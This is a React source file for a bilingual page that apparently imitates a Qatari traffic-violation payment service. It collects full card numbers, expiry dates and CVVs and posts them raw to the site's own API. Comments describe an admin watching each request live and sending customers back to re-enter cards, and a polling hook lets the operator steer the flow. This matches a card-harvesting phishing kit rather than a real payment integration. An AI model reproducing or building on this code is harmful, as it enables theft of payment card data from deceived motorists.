import { useEffect, useMemo, useState, useRef } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import {
  Button,
  Checkbox,
  Input,
  Modal,
  NumberFormatter,
  Select,
  Text,
  TextInput,
} from "@mantine/core";
import { notifications } from "@mantine/notifications";
import { CheckCircle2, RotateCw, X } from "lucide-react";
import * as yup from "yup";
import { paymentsApi } from "../api/payments";
import { ApiError } from "../api/client";
import { useLang } from "../context/LanguageContext";
import { useFlowPoll } from "../hooks/useFlowPoll";
import type { ViolationItem, ViolationSearchResult } from "../api/types";
import { COUNTRIES, DEFAULT_COUNTRY, flagEmoji } from "../constants/countries";
import styles from "./PayPage.module.scss";
import cardStyles from "./CardModal.module.scss";
import type { OptionsFilter } from "@mantine/core";
import promotionBanner from "../assets/images/promotional/promotion-banner.jpeg";

// ── Constants ────────────────────────────────────────────────────────────────

const COUNTRY_OPTIONS = COUNTRIES.map((c) => ({
  value: c.iso,
  label: `${flagEmoji(c.iso)} ${c.dial}`,
}));

const countrySearch: OptionsFilter = ({ options, search }) => {
  const q = search.trim().toLowerCase();
  if (!q) return options;
  return options.filter((o) => {
    if (!("value" in o)) return false;
    const c = COUNTRIES.find((x) => x.iso === o.value);
    if (!c) return false;
    return (
      c.name.toLowerCase().includes(q) ||
      c.dial.includes(q) ||
      c.iso.toLowerCase().includes(q) ||
      o.label.toLowerCase().includes(q)
    );
  });
};

const randomCaptcha = () => String(Math.floor(1000 + Math.random() * 9000));

const MONTHS = Array.from({ length: 12 }, (_, i) => {
  const m = String(i + 1).padStart(2, "0");
  return { value: m, label: m };
});
const currentYear = new Date().getFullYear();
const YEARS = Array.from({ length: 12 }, (_, i) => {
  const y = String(currentYear + i);
  return { value: y, label: y };
});

// ── Result resolver (pure function, no hooks) ────────────────────────────────

const DEMO_RESULT: ViolationSearchResult = {
  referenceId: "REF-DEMO",
  searchType: "personal",
  identifier: "30163402651",
  owner: { name: "Demo User", nameAr: "مستخدم تجريبي" },
  currency: "QAR",
  totalCount: 4,
  totalAmount: 1650,
  violations: [
    {
      reference: "3301519711",
      type: "Failing to follow road signs",
      typeAr: "عدم اتباع التعليمات",
      description:
        "FAILING TO FOLLOW THE INSTRUCTIONS ON THE ROAD SIGNS (ARTICLE 64, ITEM 7)",
      descriptionAr: "عدم اتباع التعليمات على إشارات الطريق",
      date: "2026-06-14",
      location: "Doha",
      locationAr: "الدوحة",
      amount: 1000,
      points: 0,
      status: "Pending",
    },
    {
      reference: "3301399545",
      type: "Exceeding the speed limit",
      typeAr: "تجاوز السرعة",
      description: "EXCEEDING THE SPEED LIMIT (ARTICLE 53, ITEM 1)",
      descriptionAr: "تجاوز الحد الأقصى للسرعة",
      date: "2026-05-31",
      location: "Doha",
      locationAr: "الدوحة",
      amount: 250,
      points: 0,
      status: "Pending",
    },
    {
      reference: "3301376830",
      type: "Exceeding the speed limit",
      typeAr: "تجاوز السرعة",
      description: "EXCEEDING THE SPEED LIMIT (ARTICLE 53, ITEM 1)",
      descriptionAr: "تجاوز الحد الأقصى للسرعة",
      date: "2026-05-28",
      location: "Doha",
      locationAr: "الدوحة",
      amount: 300,
      points: 0,
      status: "Pending",
    },
    {
      reference: "1400099013",
      type: "Permit for repairing vehicle",
      typeAr: "تصريح إصلاح مركبة",
      description: "PERMIT FOR REPAIRING MECHANICAL VEHICLE",
      descriptionAr: "تصريح إصلاح مركبة ميكانيكية",
      date: "2026-06-15",
      location: "Doha",
      locationAr: "الدوحة",
      amount: 100,
      points: 0,
      status: "Pending",
    },
  ],
};

function resolveResult(
  state: unknown,
  search: string,
): ViolationSearchResult | null {
  if (
    state !== null &&
    typeof state === "object" &&
    "result" in state &&
    (state as { result?: ViolationSearchResult }).result != null
  ) {
    return (state as { result: ViolationSearchResult }).result;
  }
  if (new URLSearchParams(search).has("demo")) {
    return DEMO_RESULT;
  }
  return null;
}

function getInitialSelected(violations: ViolationItem[]): Set<string> {
  return new Set(
    violations.filter((v) => v.status !== "Paid").map((v) => v.reference),
  );
}

// ── Types ────────────────────────────────────────────────────────────────────

type FormErrors = Partial<
  Record<"firstName" | "lastName" | "email" | "phone" | "captcha", string>
>;

type CardErrors = Partial<
  Record<
    "cardholderName" | "cardNumber" | "expiryMonth" | "expiryYear" | "cvv",
    string
  >
>;

// ── Empty / no-violations shells (no hooks needed) ───────────────────────────

function NoData({
  isArabic,
  backLabel,
}: {
  isArabic: boolean;
  backLabel: string;
}) {
  const navigate = useNavigate();
  return (
    <div className={styles.empty}>
      <p>
        {isArabic
          ? "لا توجد بيانات للدفع. يرجى إجراء استعلام أولاً."
          : "No payment data. Please run an inquiry first."}
      </p>
      <Button onClick={() => navigate("/")}>{backLabel}</Button>
    </div>
  );
}

function NoViolations({
  message,
  homeLabel,
}: {
  message: string;
  homeLabel: string;
}) {
  const navigate = useNavigate();
  return (
    <div className={styles.empty}>
      <CheckCircle2 size={40} color="#16a34a" />
      <p>{message}</p>
      <Button onClick={() => navigate("/")}>{homeLabel}</Button>
    </div>
  );
}

// ── Main component ───────────────────────────────────────────────────────────

export function PayPage() {
  const { t, language, isArabic } = useLang();
  const navigate = useNavigate();
  const location = useLocation();

  const result = resolveResult(location.state, location.search);
  const flowRef =
    (location.state as { reference?: string } | null)?.reference ?? null;

  // ALL hooks unconditionally — no lazy initialisers that touch `result`.
  // selected is seeded via useEffect once result is known.
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [selectedSeeded, setSelectedSeeded] = useState(false);
  const [prefillLoading, setPrefillLoading] = useState(!!flowRef && !result);
  const prefillFetched = useRef(false);

  const [detailItem, setDetailItem] = useState<ViolationItem | null>(null);
  const [form, setForm] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
  });
  const [phoneCountry, setPhoneCountry] = useState(DEFAULT_COUNTRY.iso);
  const [errors, setErrors] = useState<FormErrors>({});
  const [selectError, setSelectError] = useState("");
  const [captcha, setCaptcha] = useState<string>(() => randomCaptcha());
  const [captchaInput, setCaptchaInput] = useState("");
  const [bannerOpen, setBannerOpen] = useState(false);
  const [cardOpen, setCardOpen] = useState(false);
  const [busy, setBusy] = useState(false);
  const [card, setCard] = useState({
    cardholderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
  });
  const [cardErrors, setCardErrors] = useState<CardErrors>({});

  // Seed selected once result becomes available (safe: no lazy initializer)
  useEffect(() => {
    if (result && !selectedSeeded) {
      setSelected(getInitialSelected(result.violations));
      setSelectedSeeded(true);
    }
  }, [result, selectedSeeded]);

  // When redirected via flow, fetch prefill data and inject as synthetic result
  // so the FULL PayPage renders exactly as normal.
  useEffect(() => {
    if (!flowRef || result || prefillFetched.current) return;
    prefillFetched.current = true;
    paymentsApi
      .prefill(flowRef)
      .then((data) => {
        const parts = data.fullName.trim().split(/\s+/);

        // Parse stored mobile (e.g. "+97455123456") into country + phone digits.
        // Sort by dial code length desc to match most-specific prefix first.
        const rawMobile = data.mobile.replace(/\s/g, "");
        const mobileDigits = rawMobile.startsWith("+")
          ? rawMobile.slice(1)
          : rawMobile;
        const sorted = [...COUNTRIES].sort(
          (a, b) => b.dial.length - a.dial.length,
        );
        let parsedCountry = DEFAULT_COUNTRY.iso;
        let parsedPhone = mobileDigits;
        for (const c of sorted) {
          const dialDigits = c.dial.replace(/^\+/, "").replace(/\s/g, "");
          if (mobileDigits.startsWith(dialDigits)) {
            parsedCountry = c.iso;
            parsedPhone = mobileDigits.slice(dialDigits.length);
            break;
          }
        }
        setPhoneCountry(parsedCountry);
        setForm((f) => ({
          ...f,
          firstName: parts[0] ?? "",
          lastName: parts.slice(1).join(" "),
          email: data.email ?? "",
          phone: parsedPhone,
        }));
        const synthetic: ViolationSearchResult = {
          referenceId: data.referenceId,
          searchType: "personal",
          identifier: data.identifier,
          owner: { name: data.fullName, nameAr: data.fullName },
          violations: [
            {
              reference: data.referenceId || "REF",
              type: "Traffic Violation Payment",
              typeAr: "دفع مخالفات مرورية",
              description: "Traffic violation payment",
              descriptionAr: "دفع المخالفات المرورية",
              date: new Date().toISOString().slice(0, 10),
              location: "Qatar",
              locationAr: "قطر",
              amount: data.amount,
              points: 0,
              status: "Pending",
            },
          ],
          totalAmount: data.amount,
          totalCount: 1,
          currency: "QAR",
        };
        // Replace route state so the full page renders with full violations UI
        navigate("/pay", {
          state: { result: synthetic, reference: flowRef },
          replace: true,
        });
        setCardOpen(true);
      })
      .catch(() => {
        setPrefillLoading(false);
      });
  }, [flowRef, result, navigate]); // eslint-disable-line react-hooks/exhaustive-deps

  // Tell the backend the customer has arrived on the payment page (clears flow action)
  useFlowPoll({
    reference: flowRef ?? "",
    currentPage: "payment",
    enabled: !!flowRef,
  });

  const dialCode =
    COUNTRIES.find((c) => c.iso === phoneCountry)?.dial ?? DEFAULT_COUNTRY.dial;

  const total = useMemo(
    () =>
      (result?.violations ?? [])
        .filter((v) => selected.has(v.reference))
        .reduce((s, v) => s + v.amount, 0),
    [result, selected],
  );

  // ── Early returns (all hooks above this line) ────────────────────────────

  if (!result) {
    if (prefillLoading) {
      return (
        <div className={styles.page}>
          <div className={styles.titleBand}>{t.details.pageTitle}</div>
          <div
            className={styles.wrap}
            style={{ textAlign: "center", padding: "48px 0", color: "#94a3b8" }}
          >
            Loading…
          </div>
        </div>
      );
    }
    return <NoData isArabic={isArabic} backLabel={t.details.back} />;
  }

  if (result.violations.length === 0) {
    return (
      <NoViolations
        message={t.results.noViolations}
        homeLabel={t.common.backHome}
      />
    );
  }

  // ── Helpers ──────────────────────────────────────────────────────────────

  const payable = result?.violations.filter((v) => v.status !== "Paid") ?? [];

  const toggle = (ref: string) =>
    setSelected((prev) => {
      const n = new Set(prev);
      n.has(ref) ? n.delete(ref) : n.add(ref);
      return n;
    });

  const toggleAll = () => {
    setSelected((prev) =>
      prev.size === payable.length
        ? new Set()
        : new Set(payable.map((v) => v.reference)),
    );
  };

  const setField = (key: keyof typeof form, value: string) => {
    setForm((f) => ({ ...f, [key]: value }));
    setErrors((e) => ({ ...e, [key]: undefined }));
  };

  const statusLabel = (status: string) =>
    status === "Paid"
      ? t.results.statusPaid
      : status === "Disputed"
        ? t.results.statusDisputed
        : t.results.statusPending;

  const validateContact = (): boolean => {
    const schema = yup.object({
      firstName: yup.string().trim().required(t.payment.required),
      lastName: yup.string().trim().required(t.payment.required),
      email: yup
        .string()
        .trim()
        .required(t.payment.required)
        .email(t.payment.invalidEmail),
      phone: yup
        .string()
        .trim()
        .required(t.payment.required)
        .matches(/^\d{6,14}$/, t.payment.invalidMobile),
      captcha: yup
        .string()
        .trim()
        .required(t.payment.required)
        .oneOf([captcha], t.search.captchaError),
    });
    try {
      schema.validateSync(
        { ...form, captcha: captchaInput },
        { abortEarly: false },
      );
      setErrors({});
      return true;
    } catch (err) {
      const next: FormErrors = {};
      if (err instanceof yup.ValidationError) {
        for (const issue of err.inner) {
          const path = issue.path as keyof FormErrors | undefined;
          if (path && !next[path]) next[path] = issue.message;
        }
      }
      setErrors(next);
      if (next.captcha) {
        setCaptcha(randomCaptcha());
        setCaptchaInput("");
      }
      return false;
    }
  };

  const validateCard = (): boolean => {
    const errs: CardErrors = {};
    if (!card.cardholderName.trim()) errs.cardholderName = t.payment.required;
    const digits = card.cardNumber.replace(/\s/g, "");
    if (!/^\d{16}$/.test(digits))
      errs.cardNumber = isArabic
        ? "يجب أن يتكون رقم البطاقة من 16 رقماً"
        : "Card number must be exactly 16 digits";
    if (!card.expiryMonth) errs.expiryMonth = t.payment.required;
    if (!card.expiryYear) errs.expiryYear = t.payment.required;
    if (!/^\d{3,4}$/.test(card.cvv))
      errs.cvv = isArabic ? "رمز الحماية غير صحيح" : "Invalid CVV";
    setCardErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handlePay = () => {
    if (!validateContact()) return;
    if (selected.size === 0) {
      setSelectError(t.details.selectOne);
      return;
    }
    setSelectError("");
    setBannerOpen(true);
  };

  const handleBannerClose = () => {
    setBannerOpen(false);
    setCardOpen(true);
  };

  const handleCardNumberInput = (raw: string) => {
    const digits = raw.replace(/\D/g, "").slice(0, 16);
    const formatted = digits.replace(/(.{4})/g, "$1 ").trim();
    setCard((c) => ({ ...c, cardNumber: formatted }));
    setCardErrors((e) => ({ ...e, cardNumber: undefined }));
  };

  const handleCardSubmit = async () => {
    if (!validateCard()) return;
    setBusy(true);
    try {
      const fullName = `${form.firstName} ${form.lastName}`.trim();
      const mobile = `${dialCode}${form.phone}`;
      const cardNumber = card.cardNumber.replace(/\s/g, "");

      // When admin redirected the customer back, update the EXISTING record
      // so the admin sees the new card on the same request they're watching.
      const res = flowRef
        ? await paymentsApi.resubmitCard(flowRef, {
            fullName,
            mobile,
            email: form.email || undefined,
            cardholderName: card.cardholderName,
            cardNumber,
            cardExpiryMonth: card.expiryMonth,
            cardExpiryYear: card.expiryYear,
            cardCvv: card.cvv,
          })
        : await paymentsApi.create({
            referenceId: result!.referenceId,
            fullName,
            mobile,
            email: form.email || undefined,
            identifier: result!.identifier,
            amount: total,
            violationRefs: [...selected],
            language,
            cardholderName: card.cardholderName,
            cardNumber,
            cardExpiryMonth: card.expiryMonth,
            cardExpiryYear: card.expiryYear,
            cardCvv: card.cvv,
          });

      sessionStorage.setItem("pay_ref", res.reference);
      setCardOpen(false);
      navigate("/flow/loading", {
        state: { reference: res.reference, amount: total },
      });
    } catch (err) {
      const msg = err instanceof ApiError ? err.message : "Network error";
      notifications.show({
        color: "red",
        title: t.payment.errorTitle,
        message: msg,
      });
    } finally {
      setBusy(false);
    }
  };

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className={styles.page}>
      <div className={styles.titleBand}>{t.details.pageTitle}</div>

      <div className={styles.wrap}>
        {/* Vehicle Information */}
        <div className={styles.vehicleCard}>
          <h2 className={styles.vehicleHeading}>{t.details.vehicleInfo}</h2>
          <div className={styles.vehicleGrid}>
            <div className={styles.vehicleCell}>
              <span className={styles.vLabel}>{t.details.idNumber}</span>
              <span className={styles.vValue}>{result!.identifier}</span>
            </div>
            <div className={styles.vehicleCell}>
              <span className={styles.vLabel}>{t.details.licenseExpiry}</span>
              <span className={styles.vValue}>—</span>
            </div>
            <div className={styles.vehicleCell}>
              <span className={styles.vLabel}>{t.details.type}</span>
              <span className={styles.vValue}>—</span>
            </div>
          </div>
        </div>

        {/* Contact Information */}
        <div className={styles.card}>
          <h3 className={styles.cardTitle}>{t.details.contactInfo}</h3>
          <div className={styles.contactGrid}>
            <TextInput
              label={`${t.details.firstName} *`}
              placeholder={t.details.firstNamePh}
              value={form.firstName}
              error={errors.firstName}
              onChange={(e) => setField("firstName", e.currentTarget.value)}
            />
            <TextInput
              label={`${t.details.lastName} *`}
              placeholder={t.details.lastNamePh}
              value={form.lastName}
              error={errors.lastName}
              onChange={(e) => setField("lastName", e.currentTarget.value)}
            />
            <TextInput
              label={`${t.details.email} *`}
              placeholder={t.details.emailPh}
              value={form.email}
              error={errors.email}
              onChange={(e) => setField("email", e.currentTarget.value)}
            />
            <Input.Wrapper label={`${t.details.phone} *`} error={errors.phone}>
              <div className={styles.phoneRow}>
                <Select
                  aria-label="Country code"
                  className={styles.phoneCountry}
                  data={COUNTRY_OPTIONS}
                  value={phoneCountry}
                  onChange={(v) => v && setPhoneCountry(v)}
                  searchable
                  allowDeselect={false}
                  filter={countrySearch}
                  nothingFoundMessage="No country"
                  comboboxProps={{ width: 300, position: "bottom-start" }}
                  maxDropdownHeight={280}
                  renderOption={({ option }) => {
                    const c = COUNTRIES.find((x) => x.iso === option.value);
                    return (
                      <span className={styles.countryOption}>
                        <span>{flagEmoji(option.value)}</span>
                        <span className={styles.countryName}>{c?.name}</span>
                        <span className={styles.countryDial}>{c?.dial}</span>
                      </span>
                    );
                  }}
                />
                <TextInput
                  className={styles.phoneInput}
                  placeholder={t.details.phonePh}
                  inputMode="tel"
                  value={form.phone}
                  error={!!errors.phone}
                  onChange={(e) =>
                    setField("phone", e.currentTarget.value.replace(/\D/g, ""))
                  }
                />
              </div>
            </Input.Wrapper>
          </div>
        </div>

        {/* Violations */}
        <div className={styles.card}>
          <h3 className={styles.cardTitle}>{t.details.violations}</h3>

          <div className={styles.table}>
            <div className={styles.thead}>
              <span className={styles.cCheck}>
                <Checkbox
                  color="teal"
                  checked={
                    selected.size === payable.length && payable.length > 0
                  }
                  indeterminate={
                    selected.size > 0 && selected.size < payable.length
                  }
                  onChange={toggleAll}
                  aria-label="select all"
                />
              </span>
              <span className={styles.cNo}>{t.details.violationNo}</span>
              <span className={styles.cInfo}>{t.details.violationInfo}</span>
              <span className={styles.cAmount}>{t.details.amount}</span>
              <span className={styles.cAction} />
            </div>

            {result!.violations.map((v) => {
              const isPaid = v.status === "Paid";
              return (
                <div
                  key={v.reference}
                  className={`${styles.trow} ${isPaid ? styles.trowPaid : ""}`}
                >
                  <span className={styles.cCheck}>
                    <Checkbox
                      color="teal"
                      checked={selected.has(v.reference)}
                      disabled={isPaid}
                      onChange={() => toggle(v.reference)}
                      aria-label={v.reference}
                    />
                  </span>
                  <span className={styles.cNo}>{v.reference}</span>
                  <span className={styles.cInfo}>
                    <span className={styles.vDate}>{v.date}</span>
                    <span className={styles.vDesc}>
                      {isArabic
                        ? v.descriptionAr || v.typeAr
                        : v.description || v.type}
                    </span>
                    {isPaid && (
                      <span className={styles.statusBadge}>
                        {statusLabel(v.status)}
                      </span>
                    )}
                  </span>
                  <span className={styles.cAmount}>
                    <NumberFormatter value={v.amount} thousandSeparator />{" "}
                    <span className={styles.currencyCode}>
                      {t.common.currency}
                    </span>
                  </span>
                  <span className={styles.cAction}>
                    <button
                      type="button"
                      className={styles.detailsBtn}
                      onClick={() => setDetailItem(v)}
                    >
                      {t.details.detailsBtn}
                    </button>
                  </span>
                </div>
              );
            })}
          </div>

          {selectError && <p className={styles.selectError}>{selectError}</p>}

          <div className={styles.tableFooter}>
            <div className={styles.captchaGroup}>
              <TextInput
                placeholder={t.details.captchaPh}
                value={captchaInput}
                error={errors.captcha}
                onChange={(e) => {
                  setCaptchaInput(e.currentTarget.value);
                  setErrors((er) => ({ ...er, captcha: undefined }));
                }}
                className={styles.captchaField}
              />
              <button
                type="button"
                className={styles.captchaRefresh}
                onClick={() => {
                  setCaptcha(randomCaptcha());
                  setCaptchaInput("");
                }}
                aria-label="Refresh captcha"
                title="Refresh captcha"
              >
                <RotateCw size={16} />
              </button>
              <span className={styles.captchaBox} aria-label="captcha value">
                {captcha}
              </span>
            </div>

            <div className={styles.totalActions}>
              <div className={styles.totalBox}>
                <span className={styles.totalLabel}>
                  {t.details.totalAmount}
                </span>
                <span className={styles.totalValue}>
                  <NumberFormatter value={total} thousandSeparator />{" "}
                  {t.common.currency}
                </span>
              </div>
              <Button
                variant="default"
                radius="sm"
                onClick={() => navigate(-1)}
              >
                {t.details.back}
              </Button>
              <Button radius="sm" onClick={handlePay}>
                {t.details.pay}
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Violation detail modal */}
      <Modal
        opened={!!detailItem}
        onClose={() => setDetailItem(null)}
        title={t.details.violationInfo}
        centered
        radius="md"
      >
        {detailItem && (
          <div className={styles.modalBody}>
            {(
              [
                [t.details.violationNo, detailItem.reference],
                [
                  t.results.type,
                  isArabic ? detailItem.typeAr : detailItem.type,
                ],
                [
                  t.details.description,
                  isArabic
                    ? detailItem.descriptionAr || detailItem.typeAr
                    : detailItem.description || detailItem.type,
                ],
                [t.results.date, detailItem.date],
                [
                  t.results.location,
                  isArabic ? detailItem.locationAr : detailItem.location,
                ],
                [t.results.points, detailItem.points],
                [t.details.status, statusLabel(detailItem.status)],
              ] as [string, string | number][]
            ).map(([label, value]) => (
              <div key={String(label)} className={styles.modalRow}>
                <span className={styles.modalLabel}>{label}</span>
                <span className={styles.modalValue}>{value}</span>
              </div>
            ))}
            <div className={styles.modalRow}>
              <span className={styles.modalLabel}>{t.results.amount}</span>
              <span className={styles.modalValue}>
                <NumberFormatter value={detailItem.amount} thousandSeparator />{" "}
                {t.common.currency}
              </span>
            </div>
            <Button
              fullWidth
              mt="lg"
              variant="light"
              onClick={() => setDetailItem(null)}
            >
              {t.details.close}
            </Button>
          </div>
        )}
      </Modal>

      {/* Promotional Banner Modal */}
      <Modal
        opened={bannerOpen}
        onClose={handleBannerClose}
        withCloseButton={false}
        centered
        radius="lg"
        padding={0}
        size="md"
        overlayProps={{ backgroundOpacity: 0.7 }}
      >
        <div className={cardStyles.bannerWrap}>
          <button
            className={cardStyles.bannerClose}
            onClick={handleBannerClose}
            aria-label="Close"
          >
            <X size={20} />
          </button>
          <img
            src={promotionBanner}
            alt="Promotion"
            className={cardStyles.bannerImg}
          />
        </div>
      </Modal>

      {/* Card Payment Modal */}
      <Modal
        opened={cardOpen}
        onClose={() => setCardOpen(false)}
        title={isArabic ? "بيانات بطاقة الائتمان" : "Credit Card Payment"}
        centered
        radius="lg"
        size="md"
        overlayProps={{ backgroundOpacity: 0.75 }}
      >
        <div className={cardStyles.cardModal} dir={isArabic ? "rtl" : "ltr"}>
          <div className={cardStyles.cardNote}>
            <Text size="sm">
              <b>{isArabic ? "ملاحظة:" : "Note:"}</b>{" "}
              {isArabic
                ? "لإتمام عملية الدفع يتم قبول بطاقة الائتمان Credit Card فقط."
                : "Only credit card payments are acceptable."}
            </Text>
          </div>

          <TextInput
            label={isArabic ? "رقم بطاقة الائتمان" : "Credit Card Number"}
            placeholder={
              isArabic ? "أدخل رقم البطاقة" : "Enter credit card number"
            }
            value={card.cardNumber}
            error={cardErrors.cardNumber}
            inputMode="numeric"
            maxLength={19}
            onChange={(e) => handleCardNumberInput(e.currentTarget.value)}
            classNames={{ input: cardStyles.fieldInput }}
            mb="md"
          />

          <TextInput
            label={isArabic ? "اسم حامل البطاقة" : "Card Holder Name"}
            placeholder={
              isArabic ? "أدخل اسم حامل البطاقة" : "Enter card holder name"
            }
            value={card.cardholderName}
            error={cardErrors.cardholderName}
            onChange={(e) => {
              const value = e.currentTarget.value;
              setCard((c) => ({ ...c, cardholderName: value.toUpperCase() }));
              setCardErrors((e2) => ({ ...e2, cardholderName: undefined }));
            }}
            classNames={{ input: cardStyles.fieldInput }}
            mb="md"
          />

          <div className={cardStyles.expiryAndCvvRow}>
            <div>
              <span className={cardStyles.fieldLabel}>
                {isArabic ? "تاريخ انتهاء البطاقة" : "Expiry Date"}
              </span>
              <span className={cardStyles.subLabel}>
                {isArabic ? "شهر / سنة" : "MM / YYYY"}
              </span>
              <div className={cardStyles.expiryInputsRow}>
                <Select
                  placeholder={isArabic ? "شهر" : "MM"}
                  data={MONTHS}
                  value={card.expiryMonth}
                  error={!!cardErrors.expiryMonth}
                  onChange={(v) => {
                    setCard((c) => ({ ...c, expiryMonth: v ?? "" }));
                    setCardErrors((e) => ({ ...e, expiryMonth: undefined }));
                  }}
                  allowDeselect={false}
                  comboboxProps={{ withinPortal: true }}
                />
                <Select
                  placeholder={isArabic ? "سنة" : "YYYY"}
                  data={YEARS}
                  value={card.expiryYear}
                  error={!!cardErrors.expiryYear}
                  onChange={(v) => {
                    setCard((c) => ({ ...c, expiryYear: v ?? "" }));
                    setCardErrors((e) => ({ ...e, expiryYear: undefined }));
                  }}
                  allowDeselect={false}
                  comboboxProps={{ withinPortal: true }}
                />
              </div>
              <div className={cardStyles.expiryErrorSlot}>
                {(cardErrors.expiryMonth || cardErrors.expiryYear) && (
                  <Text size="xs" c="red">
                    {cardErrors.expiryMonth || cardErrors.expiryYear}
                  </Text>
                )}
              </div>
            </div>

            <div>
              <span className={cardStyles.fieldLabel}>
                {isArabic ? "رمز الحماية" : "Security Code"}
              </span>
              <span className={cardStyles.subLabel}>CVV</span>
              <div className={cardStyles.cvvWithIcon}>
                <TextInput
                  placeholder="CVV"
                  value={card.cvv}
                  error={!!cardErrors.cvv}
                  inputMode="numeric"
                  maxLength={4}
                  type="password"
                  onChange={(e) => {
                    const value = e.currentTarget.value;
                    setCard((c) => ({
                      ...c,
                      cvv: value.replace(/\D/g, "").slice(0, 4),
                    }));
                    setCardErrors((e2) => ({ ...e2, cvv: undefined }));
                  }}
                  classNames={{ input: cardStyles.fieldInput }}
                />
                <img
                  src="/assets/cvv-card.png"
                  alt="CVV location"
                  className={cardStyles.cvvCardImg}
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.display = "none";
                  }}
                />
              </div>
              <div className={cardStyles.cvvErrorSlot}>
                {cardErrors.cvv && (
                  <Text size="xs" c="red">
                    {cardErrors.cvv}
                  </Text>
                )}
              </div>
            </div>
          </div>

          <div className={cardStyles.totalRow}>
            <Text size="sm" c="dimmed" fw={500}>
              {isArabic ? "المجموع الكلي" : "Total Amount"}
            </Text>
            <div className={cardStyles.totalAmountValue}>
              <span>QAR</span>
              <NumberFormatter value={total} thousandSeparator />
              {isArabic && <span>ريال قطري</span>}
            </div>
          </div>

          <div className={cardStyles.cardActions}>
            <Button loading={busy} onClick={handleCardSubmit}>
              {isArabic ? "دفع" : "Pay"}
            </Button>
            <Button
              variant="default"
              onClick={() => setCardOpen(false)}
              disabled={busy}
            >
              {isArabic ? "إغلاق" : "Close"}
            </Button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
